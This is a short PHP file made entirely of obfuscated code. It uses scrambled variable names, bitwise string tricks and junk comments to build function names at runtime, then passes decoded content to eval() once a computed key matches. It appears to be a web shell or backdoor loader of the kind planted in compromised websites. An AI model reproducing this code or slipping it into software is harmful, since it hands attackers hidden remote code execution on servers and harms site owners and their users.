<?php
$QWjvcJA9='yBR9vVE'&~ix5NBYV;$yKddWx6KQV=", 0"|'ad!';$y5=HQPP.'^e'|'@'.ETPMd;'CKch487k3V'.
          'Ze}T_?';$p8ok0gOEzKx=xZu&'`E-';$i5CyU='zO4?f|'^'<jtZ"(';$DVKQgM2XG=/*s4YhYL3M'.
          'z*/iDTPKLVJEEHQTAMXUZ|hRTIU0KGKOEp."[ IKP[";$TgSzFvk='_T_~_{'._OoO.#pmpVypjzs'.
          '{__w~iM{'&'^'.v_U_Z_.'~O{{'.O___.'{[s';$i_0f=$yKddWx6KQV|$p8ok0gOEzKx;'epEycb'.
          't=q';$C0Dk=$i5CyU|('wz|yov'&odva.'~w');$gn=(':i=6f('^s7HN9a)&$y5;$am=(PE39.'~'.
          ''.JKHO.'(Sf z^52rIX%Y ;%'.rAIz.'<Y:'^'7u~`)};-}a:$'.h0zrd.#aFsaOJW41r2EYeygbk'.
          '*k{k}uj};:<#g4X')^("=wT^".Jom8s.")iU>#9".WTFkhFwM."#CGk}WIp*"^'o#(2y:(n Y1 OY'.
          'x)3--(<6(Gz?#97q)z');$B084iu=$DVKQgM2XG&$TgSzFvk;if($i_0f($C0Dk($gn))==$am)/*'.
          'Wg*/eval($C0Dk($B084iu));#|?5F|47KnpksFL4k).Z}7+6zxo)mCPFfhy|?uI#U0AyOGkKoSM'.
          'u3vn)CbF:} 8.5e0wjT-$xny._te4c~wC!lFe9!xDK7UR';